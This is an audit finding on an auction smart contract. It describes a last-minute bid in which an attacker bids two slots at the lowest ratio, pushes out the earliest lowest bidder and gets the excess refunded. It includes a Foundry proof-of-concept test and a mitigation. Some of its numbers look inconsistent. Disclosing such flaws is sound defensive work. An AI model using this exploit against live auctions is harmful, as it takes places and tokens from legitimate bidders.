# Last-Minute Bid Exploit in Auction Contract Allowing Attacker Participation and Displacement of Legitimate Bidders

### Summary
For example:
Say  totalBuyCouponAmount = 10,00 and maxBids = 4
slot = 250.

Alice1    50(buyReserveAmount)   250(sellCouponAmount),    5(Ratio)
Alice2   30(buyReserveAmount)  250(sellCouponAmount)	 8.33(Ratio)
Alice3   20(buyReserveAmount)	250(sellCouponAmount)	 12.5(Ratio)
Alice4    10(buyReserveAmount)	  250(sellCouponAmount)	25(Ratio)

Just before auction ends, if the attacker bids with (100(buyReserveAmount), 500(sellCouponAmount), 5(Ratio)),
 250(sellCouponAmount) goes back to attacker. 
amountToRemove(250) = currentCouponAmount(1250) - totalBuyCouponAmount(1000). 
(By removeExcessBids function).
so Result becomes as below.

attacker    50(buyReserveAmount)   250(sellCouponAmount),    5(Ratio)
Alice2   30(buyReserveAmount)  250(sellCouponAmount)	 8.33(Ratio)
Alice3   20(buyReserveAmount)	250(sellCouponAmount)	 12.5(Ratio)
Alice4    10(buyReserveAmount)	  250(sellCouponAmount)	25(Ratio)

 The attacker can participate in auction with the lowest ratio and amount of alice1 and alice1 cannot participate in auction.

### Root Cause
Just before the auction ends, assume that the bidCount has reached maxBids. In this case, the sellCouponAmount for each bid is equal to one slot, calculated as totalBuyCouponAmount / maxBids. If the attacker places a bid with 2 slots at the same ratio as the lowest bid in the bid list, the lowest bid is removed, and the attacker's bid is added.

After that, the attacker places a bid with the same lowest ratio, and the overflow of one slot is returned. This allows the attacker to participate in the auction by bidding with the same ratio and amount as the lowest bidder, even if the lowest bidder had participated in the auction from the beginning.

### Internal Pre-conditions
The bidCount equals maxBids.

### External Pre-conditions

### Attack Path
Just before the auction ends, the attacker has to bid.

### Impact

1.The attacker can participate in the auction by bidding just before it ends with the same ratio and amount as the lowest bidder in the list.
2.The legitimate bidder cannot participate in the auction.
3.The attacker can repeat this operation.
4.The attacker can secure the highest amount of reserve tokens in the auction by bidding just before it ends.

### PoC

```solidity
  function testMyBid() public {
    uint256 slot = 5000 / 4;     // maxbids is 4, totalBuyCouponAmount is 5000.

    vm.startPrank(bob1);     //bob1 (lowest) first bid from beginnig
    usdc.mint(bob1, slot);
    usdc.approve(address(auction), 5000);
    auction.bid(1000, slot); // 
    vm.stopPrank();

    vm.startPrank(bob2);  // second bid 
    usdc.mint(bob2, slot);
    usdc.approve(address(auction), slot);
    auction.bid(300, slot);  
    vm.stopPrank();

    vm.startPrank(bob3);  // 3rd bid 
    usdc.mint(bob3, slot);
    usdc.approve(address(auction), slot);
    auction.bid(200, slot);  
    vm.stopPrank();

    vm.startPrank(bob4);  // 4th bid 
    usdc.mint(bob4, slot);
    usdc.approve(address(auction), slot);
    auction.bid(100, slot);  
    vm.stopPrank();
   
    vm.warp(auction.endTime() - 1 hours);  // just before auction ends.
    vm.startPrank(attacker); // attacker
    usdc.mint(attacker, 2*slot);
    usdc.approve(address(auction), 2*slot);
    auction.bid(2000, 2*slot); // 
    vm.stopPrank();

    vm.warp(auction.endTime()); // auction end.
    vm.prank(pool); 
    auction.endAuction();
    uint256 lastbidindex = auction.lastBidIndex();
    (address bidaddress,uint256 reserveamount,uint256 couponamount,,,) = auction.bids(lastbidindex);
    assertEq(bidaddress, address(attacker)); // bidder's address is attacker
    assertEq(reserveamount,1000); // reserveamount is same as bob1
    assertEq(couponamount, slot); // copounamount is same as bob1
    vm.stopPrank();
  }
```
the attacker gets highest amount of reserve token in auction by bidding just before auction ends
### Mitigation

There needs to be a validation based on a time limit just before the auction ends.
